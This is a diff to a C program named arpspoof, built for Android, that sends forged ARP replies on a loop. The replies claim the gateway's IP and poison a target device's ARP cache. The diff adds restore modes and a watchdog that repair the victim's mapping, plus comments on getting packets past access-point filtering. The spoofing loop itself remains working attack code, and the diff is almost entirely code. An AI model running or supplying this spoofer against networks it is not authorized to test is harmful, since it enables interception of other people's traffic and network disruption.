@@ -1,9 +1,15 @@
 // arpspoof - continuously ARP-spoof a target claiming the gateway's IP.
-// Usage: arpspoof <interface> <target_ip> <target_mac> <gateway_ip> <gateway_mac>
-// On SIGTERM: restore the correct gateway mapping, then exit.
+// Usage:
+//   arpspoof [--restore-only] <iface> <target_ip> <target_mac> <gw_ip> <gw_mac> [app_pid]
+// --restore-only: send a burst of corrective replies and exit (used by the
+//   app's watchdog to rescue a victim whose spoofer died unexpectedly).
+// app_pid: when given, exit with a restore burst if that pid disappears,
+//   i.e. the owning app died and nobody is left to SIGTERM us.
+// On SIGTERM/SIGINT: restore the correct gateway mapping, then exit.
 // Linux-only (AF_PACKET). Statically compiled for Android ARM64.
 #define _GNU_SOURCE
 #include <arpa/inet.h>
+#include <errno.h>
 #include <net/if.h>
 #include <net/if_arp.h>
 #include <netinet/if_ether.h>
@@ -30,6 +36,7 @@ static mac_t g_own_mac;
 static uint8_t g_spoof_frame[FRAME_LEN];
 static uint8_t g_restore_frame[FRAME_LEN];
 static volatile sig_atomic_t g_restore_count = 0;
+static pid_t g_app_pid = 0;
 
 static uint32_t ip_from_str(const char *s) { return ntohl(inet_addr(s)); }
 
@@ -76,28 +83,59 @@ static int send_frame(const uint8_t *frame, size_t len) {
     return sendto(g_sock, frame, len, 0, (struct sockaddr *)&sll, sizeof(sll));
 }
 
+/* Send the corrective burst that repairs the victim's gateway mapping.
+ *
+ * The pause matters: stacks like macOS drop gratuitous replies that flip
+ * an entry which was just updated by a conflicting one (anti-spoofing).
+ * Restoring immediately after the last spoofed reply therefore silently
+ * fails; waiting out that window and spreading the burst makes the fix
+ * stick. */
+static void send_restore_burst(void) {
+    sleep(1);
+    for (int i = 0; i < 8; i++) {
+        if (send_frame(g_restore_frame, sizeof(g_restore_frame)) < 0)
+            perror("restore sendto");
+        usleep(400000);
+    }
+}
+
 static void sighandler(int signo) {
     (void)signo;
     g_restore_count = 5;
 }
 
 int main(int argc, char **argv) {
-    if (argc < 6) {
-        fprintf(stderr, "usage: %s <interface> <target_ip> <target_mac> <gateway_ip> <gateway_mac>\n", argv[0]);
+    int restore_only = 0;
+    int argi = 1;
+    if (argi < argc && strcmp(argv[argi], "--restore-only") == 0) {
+        restore_only = 1;
+        argi++;
+    }
+    if (argc - argi < 5) {
+        fprintf(stderr,
+                "usage: %s [--restore-only] <interface> <target_ip> <target_mac> "
+                "<gateway_ip> <gateway_mac> [app_pid]\n",
+                argv[0]);
         return 1;
     }
-    strncpy(g_ifname, argv[1], sizeof(g_ifname) - 1);
-    uint32_t target_ip = ip_from_str(argv[2]);
+    strncpy(g_ifname, argv[argi], sizeof(g_ifname) - 1);
+    uint32_t target_ip = ip_from_str(argv[argi + 1]);
     mac_t target_mac;
-    if (mac_from_str(argv[3], &target_mac) != 0) {
+    if (mac_from_str(argv[argi + 2], &target_mac) != 0) {
         fprintf(stderr, "invalid target mac\n");
         return 1;
     }
-    uint32_t gateway_ip = ip_from_str(argv[4]);
+    uint32_t gateway_ip = ip_from_str(argv[argi + 3]);
     mac_t gateway_mac;
-    if (mac_from_str(argv[5], &gateway_mac) != 0) {
+    if (mac_from_str(argv[argi + 4], &gateway_mac) != 0) {
         fprintf(stderr, "invalid gateway mac\n");
         return 1;
+    }
+    if (argc - argi >= 6) {
+        char *end = NULL;
+        long v = strtol(argv[argi + 5], &end, 10);
+        if (argv[argi + 5][0] != '\0' && end != NULL && *end == '\0' && v > 0)
+            g_app_pid = (pid_t)v;
     }
 
     g_sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
@@ -113,6 +151,13 @@ int main(int argc, char **argv) {
 
     build_arp_reply(g_spoof_frame, gateway_ip, &g_own_mac, target_ip, &target_mac);
     build_arp_reply(g_restore_frame, gateway_ip, &gateway_mac, target_ip, &target_mac);
+    /* Corrective replies must keep OUR radio identity on the wire: APs
+     * (mesh systems especially) drop client frames whose Ethernet source
+     * matches another port, e.g. the gateway itself, so spoofing the L2
+     * source would silence exactly the packets that undo the attack. The
+     * victim repairs its cache from the ARP payload, not the eth header,
+     * so announcing gw_ip -> gw_mac there is sufficient. */
+    memcpy(g_restore_frame + offsetof(struct ethhdr, h_source), g_own_mac.addr, 6);
 
     struct sigaction sa;
     memset(&sa, 0, sizeof(sa));
@@ -120,22 +165,30 @@ int main(int argc, char **argv) {
     sigaction(SIGTERM, &sa, NULL);
     sigaction(SIGINT, &sa, NULL);
 
+    if (restore_only) {
+        send_restore_burst();
+        return 0;
+    }
+
     fprintf(stderr,
             "spoofing %s (%02x:%02x:%02x:%02x:%02x:%02x) => gw %s using "
             "%02x:%02x:%02x:%02x:%02x:%02x\n",
-            argv[2], target_mac.addr[0], target_mac.addr[1], target_mac.addr[2],
+            argv[argi + 1], target_mac.addr[0], target_mac.addr[1], target_mac.addr[2],
             target_mac.addr[3], target_mac.addr[4], target_mac.addr[5],
-            argv[4], g_own_mac.addr[0], g_own_mac.addr[1], g_own_mac.addr[2],
+            argv[argi + 3], g_own_mac.addr[0], g_own_mac.addr[1], g_own_mac.addr[2],
             g_own_mac.addr[3], g_own_mac.addr[4], g_own_mac.addr[5]);
 
     for (;;) {
         if (g_restore_count > 0) {
             // Restore correct gateway->target mapping then exit.
-            for (int i = 0; i < 5; i++) {
-                send_frame(g_restore_frame, sizeof(g_restore_frame));
-                usleep(200000);
-            }
+            send_restore_burst();
             return 0;
+        }
+        if (g_app_pid > 0 && kill(g_app_pid, 0) == -1 && errno == ESRCH) {
+            // Owning app died; nobody is left to deliver a SIGTERM.
+            fprintf(stderr, "app pid %d gone, restoring\n", (int)g_app_pid);
+            g_restore_count = 5;
+            continue;
         }
         if (send_frame(g_spoof_frame, sizeof(g_spoof_frame)) < 0)
             perror("sendto");
